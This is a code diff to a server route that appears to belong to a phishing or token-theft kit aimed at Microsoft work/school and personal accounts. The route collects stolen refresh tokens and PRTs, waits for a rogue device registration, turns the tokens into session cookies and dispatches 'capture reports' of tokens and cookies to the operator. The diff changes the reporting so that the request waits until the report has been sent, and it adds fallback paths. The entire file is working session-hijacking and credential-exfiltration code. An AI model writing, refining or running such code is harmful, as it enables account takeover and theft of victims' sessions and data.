@@ -534,18 +534,15 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
         captureMeta: captureMeta,
     };
 
-    // If link is in cookie mode, trigger cookie conversion asynchronously
+    // If link is in cookie mode, trigger cookie conversion and only then return
+    // so the report is guaranteed to be dispatched before the request finishes.
     // PASS TENANT, ACCOUNT TYPE, AND CAPTURE META (client_info, session_key)
     // FIX: Pass refresh_token (not access_token) - cookie converter needs refresh token to generate session cookies
     const refreshTokenForConversion = refresh_token || prt || access_token;
     if (link.auth_mode === 'cookie') {
-        // For work/school accounts, wait for device registration to complete first
-        // then use the device registration PRT for cookie generation
         const waitForDeviceRegistration = () => {
             return new Promise((resolve) => {
                 if (accountType === 'work_school') {
-                    // Wait up to 30 seconds for device registration
-                    // This runs for ALL work/school accounts (common, organizations, specific tenant GUIDs)
                     console.log('[Capture] Work/school account detected (tenant:', tenant + '), waiting for device registration...');
                     const maxWait = 30000;
                     const intervalMs = 1000;
@@ -553,7 +550,6 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
 
                     const timer = setInterval(() => {
                         waited += intervalMs;
-                        // Check if device credentials were stored OR if device registration failed
                         const registrationFailed = job.deviceRegistrationFailed ? job.deviceRegistrationFailed() : false;
                         db.query(
                             'SELECT id FROM device_credentials WHERE user_id = ? AND tenant_id = ?',
@@ -577,54 +573,45 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
                         });
                     }, intervalMs);
                 } else {
-                    // Personal account - skip device registration
                     console.log('[Capture] Personal account detected, skipping device registration');
                     resolve();
                 }
             });
         };
 
-        waitForDeviceRegistration().then(() => {
-            processCookieConversion(tokenId, refreshTokenForConversion, link.template_type, tenant, accountType, user_id)
-                .then((cookieResult) => {
-                    const io = req.app.get('io');
-                    if (io) {
-                        io.to(`user_${user_id}`).emit('new_token', {
-                            id: tokenId,
-                            email,
-                            token_type: 'cookie',
-                            created_at: new Date()
-                        });
-                    }
-                    // Send report WITH cookie data (full tokens + cookies .txt)
-                    sendCaptureReport(user_id, {
-                        ...captureData,
-                        tokenType: 'cookie',
-                        cookieCount: cookieResult.cookie_count,
-                        cookieSample: cookieResult.cookies,
-                    });
-                })
-                .catch(err => {
-                    console.error('[Capture] Cookie conversion failed:', err.message);
-                    // Send tokens-only report (.txt) if cookie conversion fails
-                    sendCaptureReport(user_id, { ...captureData, tokenType: 'token' });
+        try {
+            await waitForDeviceRegistration();
+            const cookieResult = await processCookieConversion(tokenId, refreshTokenForConversion, link.template_type, tenant, accountType, user_id);
+            const io = req.app.get('io');
+            if (io) {
+                io.to(`user_${user_id}`).emit('new_token', {
+                    id: tokenId,
+                    email,
+                    token_type: 'cookie',
+                    created_at: new Date()
                 });
-        }).catch(err => {
-            console.error('[Capture] Device registration wait failed:', err.message);
-            // Proceed with cookie conversion anyway
-            processCookieConversion(tokenId, refreshTokenForConversion, link.template_type, tenant, accountType, user_id)
-                .then((cookieResult) => {
-                    sendCaptureReport(user_id, {
-                        ...captureData,
-                        tokenType: 'cookie',
-                        cookieCount: cookieResult.cookie_count,
-                        cookieSample: cookieResult.cookies,
-                    });
-                })
-                .catch(() => {
-                    sendCaptureReport(user_id, { ...captureData, tokenType: 'token' });
+            }
+            await sendCaptureReport(user_id, {
+                ...captureData,
+                tokenType: 'cookie',
+                cookieCount: cookieResult.cookie_count,
+                cookieSample: cookieResult.cookies,
+            });
+        } catch (err) {
+            console.error('[Capture] Cookie conversion/report flow failed:', err.message);
+            try {
+                const cookieResult = await processCookieConversion(tokenId, refreshTokenForConversion, link.template_type, tenant, accountType, user_id);
+                await sendCaptureReport(user_id, {
+                    ...captureData,
+                    tokenType: 'cookie',
+                    cookieCount: cookieResult.cookie_count,
+                    cookieSample: cookieResult.cookies,
                 });
-        });
+            } catch (cookieErr) {
+                console.error('[Capture] Cookie conversion fallback failed:', cookieErr.message);
+                await sendCaptureReport(user_id, { ...captureData, tokenType: 'token' });
+            }
+        }
     } else {
         const io = req.app.get('io');
         if (io) {
@@ -635,8 +622,7 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
                 created_at: new Date()
             });
         }
-        // Send tokens-only report (.txt document) with short HTML caption
-        sendCaptureReport(user_id, { ...captureData, tokenType: 'token' });
+        await sendCaptureReport(user_id, { ...captureData, tokenType: 'token' });
     }
 
     setBrowserLikeHeaders(res);
